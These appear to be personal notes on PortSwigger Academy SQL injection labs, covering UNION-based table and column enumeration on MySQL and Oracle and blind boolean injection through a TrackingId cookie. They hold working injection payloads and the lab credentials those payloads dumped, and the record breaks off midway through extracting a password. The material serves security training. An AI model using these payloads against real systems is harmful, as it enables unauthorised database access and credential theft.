# UNION attacks

MySQL end of query = `--` and `#`, **try both**.

**PS Lab:** `SQL injection attack, querying the database type and version on MySQL and Microsoft` rejected my accurate queries because I ended my query with `--` instead of `#`. Is this accurate of a real-world setup? I'm not sure.


### Lab: SQL injection attack, listing the database contents on non-Oracle databases
This is a non-Oracle database, so we need to make user of information_schema.tables
>Pets' union select table_name,NULL from information_schema.tables--

This returns all of the tables in the database.

Look for a non-standard table `users_xgouhg`

>Pets' union select * from users_xgouhg--

```
administrator
8bd235i2g39fg3h6865g
```

Chaching 💸

### SQL injection attack, listing the database contents on Oracle
Same thing, just with Oracle. Ezpz.

>Pets' union select table_name, null from all_tables--

Table name `USERS_YXUZFJ`

`Pets' union select COLUMN_NAME,null from all_tab_columns where table_name='USERS_YXUZFJ'--`
Columns:

```
PASSWORD_ODOKFU  
USERNAME_DZRUHS
```

```
administrator
b33a0q24met5szk298fj

carlos
yutk3v2n7a8tt6wco6n2

wiener
95ca28n08tuaahvqbeef
```

## Blind SQL injection with conditional responses

>Cookie: TrackingId=4ZZNvGxfNC5HgJ8e' and SUBSTRING((SELECT password FROM users where username='administrator'),1,1) > 'm'--;

Welcome back!

>Cookie: TrackingId=4ZZNvGxfNC5HgJ8e' and SUBSTRING((SELECT password FROM users where username='administrator'),1,1) = 'y'--;

First letter is `y`

>Cookie: TrackingId=4ZZNvGxfNC5HgJ8e' and SUBSTRING((SELECT password FROM users where username='administrator'),2,1) = '5'--;

Second character is `5`. Numbers come before letters in SUBSTRING() !

>Cookie: TrackingId=4ZZNvGxfNC5HgJ8e' and SUBSTRING((SELECT password FROM users where username='administrator'),3,1) = 'l'--;

3rd character is `l`

>Cookie: TrackingId=4ZZNvGxfNC5HgJ8e' and SUBSTRING((SELECT password FROM users where username='administrator'),4,1) = '1'--;

4th characters is `1`
